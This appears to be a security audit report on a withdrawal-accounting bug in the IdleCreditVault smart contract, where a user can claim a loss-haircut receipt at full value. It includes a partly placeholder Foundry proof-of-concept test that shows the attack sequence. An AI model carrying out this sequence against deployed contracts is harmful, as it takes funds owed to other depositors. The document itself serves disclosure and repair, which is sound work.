### Title
`lastWithdrawRequest` single-slot epoch cache lets a loss-adjusted receipt be claimed at par after a second request - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
The `IdleCreditVault` tracks per-user withdrawal receipts per epoch in `withdrawsRequestsByEpoch`, but `_claimLossAdjustedWithdrawRequest` uses the single cached slot `lastWithdrawRequest[_user]` to decide which epoch's `lossRecoveryPriceByEpoch` applies. If a user has a pending receipt in an epoch that was funded at a loss haircut (`stopEpochWithDuration` with `_lossAmount`), and then submits another `requestWithdraw` in a later, fully funded epoch, the slot is overwritten with the new epoch. On claim, the loss-adjusted path returns 0 for the new epoch and the funded path pays the *entire* `withdrawsRequests[_user]` balance — including the haircutted receipt — at par. The strategy was only funded `haircut * receipt` for that epoch, so the user overdraws underlyings that were funded for other claimants.

### Finding Description
`requestWithdraw` records both a per-epoch basis and a single "latest epoch" marker:

- `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;` and `lastWithdrawRequest[_user] = currentEpoch;` (IdleCreditVault.sol:282-293)
- `withdrawsRequests[_user] += _amount;` (aggregate)

When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` receives less than `pendingWithdraws` basis, stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * 1e18 / pendingBasis`, zeroes `pendingWithdraws`, and pulls only the haircutted amount (IdleCreditVault.sol:411-429).

On claim, `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` only — it cannot see any *other* epoch in which the user has a loss-adjusted receipt (IdleCreditVault.sol:789-801). If it returns 0, `_claimFundedWithdrawRequest` pays `withdrawsRequests[_user]` in full and clears the aggregate (IdleCreditVault.sol:338-349).

### Impact Explanation
Broken invariant: loss waterfall / one receipt one payout. A receipt whose epoch was funded at e.g. `lossRecoveryPrice = 0.5e18` is paid at `1e18` once the user re-requests in any later epoch. The excess `(1 - price) * claimBasis` is taken directly from underlyings the strategy holds for other users' funded claims and pending receipts — direct theft proportional to the unclaimed loss-adjusted basis. If the attacker is the last claimant or drains before others, remaining funded claimants become insolvent by the same amount.

### Likelihood Explanation
Requires an honest `stopEpochWithDuration`/`stopEpoch` path where the borrower underfunds pending receipts (a manager-executed partial-loss stop — allowed since manager is honest and this is a designed flow), then the attacker submits a second `requestWithdraw` before claiming. An unprivileged lender can always re-request a withdraw, so the attack only needs the attacker to hold a pending receipt during a loss stop and then request again in the buffer of the next epoch. No privileged cooperation is required.

### Recommendation
Track loss-adjusted receipt basis per epoch instead of a single latest-epoch key: iterate over the user's outstanding request epochs (e.g., a per-user epoch set or a `lossAdjustedBasisByEpoch` check inside `_claimFundedWithdrawRequest`), and subtract any `withdrawsRequestsByEpoch[_user][e]` with `lossRecoveryPriceByEpoch[e] != 0` from the par-funded amount, paying it at its recovery price. At minimum, revert `requestWithdraw` (or route it) while the user has an unclaimed receipt in an epoch with a nonzero `lossRecoveryPriceByEpoch`.

### Proof of Concept
Foundry fork test sketch (extend `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossAdjustedReceiptClaimedAtParAfterSecondRequest() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    address attacker = makeAddr('attacker');
    address victim   = makeAddr('victim');
    uint256 amount = 10_000 * ONE_SCALE;

    // Both users deposit into AA tranche
    _depositWithUser(attacker, amount, true);
    _depositWithUser(victim,   amount, true);

    // Attacker requests withdraw in epoch 0 (buffer)
    vm.prank(attacker);
    uint256 attackerBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Epoch 0 runs; borrower underfunds -> stopEpochWithDuration with loss
    _startEpochAndCheckPrices(0);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch() / 2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, /* loss */ /* > 0 */);

    uint256 lossPrice = creditVault.lossRecoveryPriceByEpoch(0);
    assertGt(lossPrice, 0);
    assertLt(lossPrice, 1e18); // haircut confirmed

    // Victim requests withdraw in epoch 1 (buffer after stop)
    vm.prank(victim);
    uint256 victimBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Attacker requests AGAIN in epoch 1, overwriting lastWithdrawRequest
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // or withdraw remaining tranche position
    assertEq(creditVault.lastWithdrawRequest(attacker), 1);

    // Epoch 1 runs and is fully funded at par
    _startEpochAndCheckPrices(1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // Attacker claims: _claimLossAdjustedWithdrawRequest checks epoch 1 (price == 0),
    // then _claimFundedWithdrawRequest pays the FULL aggregate incl. epoch-0 basis at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 attackerGot = underlying.balanceOf(attacker) - balPre;

    // Funded amount for epoch-0 receipt was attackerBasis * lossPrice / 1e18,
    // but attacker received attackerBasis (par) + epoch-1 receipt at par.
    assertGt(attackerGot, attackerBasis * lossPrice / 1e18); // overpaid by (1-lossPrice)*basis

    // Victim's claim now underflows / is short: strategy is insolvent by the excess
    vm.prank(victim);
    cdoEpoch.claimWithdrawRequest(); // receives less than victimBasis or reverts on balance
}
```

Key mechanics in the PoC: `collectWithdrawFunds` leaves the haircut reserve (IdleCreditVault.sol:417-421), `lastWithdrawRequest[attacker]` is overwritten to the fully funded epoch, so the loss-recovery lookup at IdleCreditVault.sol:790-792 misses the epoch-0 haircut and IdleCreditVault.sol:338-349 pays the aggregate at par from other users' funded underlyings.
